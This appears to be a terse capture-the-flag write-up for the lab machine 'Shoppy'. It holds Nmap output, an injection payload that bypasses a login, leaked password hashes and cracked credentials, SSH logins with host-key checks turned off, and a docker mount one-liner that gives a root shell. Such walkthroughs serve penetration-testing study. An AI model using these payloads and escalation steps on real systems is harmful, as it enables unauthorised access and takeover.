# Shoppy
### Nmap
```text
22/tcp   open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM=
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo=
|   256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk
80/tcp   open  http     syn-ack nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat? syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Tue, 22 Nov 2022 00:22:27 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 5
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 5
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 0.000327956
|     go_gc_duration_seconds{quantile="0.25"} 0.000334093
|_    go_gc_d
```

### Web Enum & Exploit
```bash
# interesting sub domain (remember to use different wordlists)
http://mattermost.shoppy.htb/login

# bypass login on http://shoppy.htb/login
admin' || '1==1

# found users cred http://shoppy.htb/exports/export-search.json
_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"

# login http://mattermost.shoppy.htb/login
josh:remembermethisway

# user cred on http://mattermost.shoppy.htb/shoppy/channels/deploy-machine
jaeger:Sh0ppyBest@pp!

# login jaeger
sshpass -p 'Sh0ppyBest@pp!' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" jaeger@$IP

```

### Priv Esc
```bash
# may run program as another user
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

# found password by view binary data
Sample

# get deploy's cred
username: deploy
password: Deploying@pp!

# switch to deploy
shpass -p 'Deploying@pp!' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" deploy@$IP

# group info
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)

# get root shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

```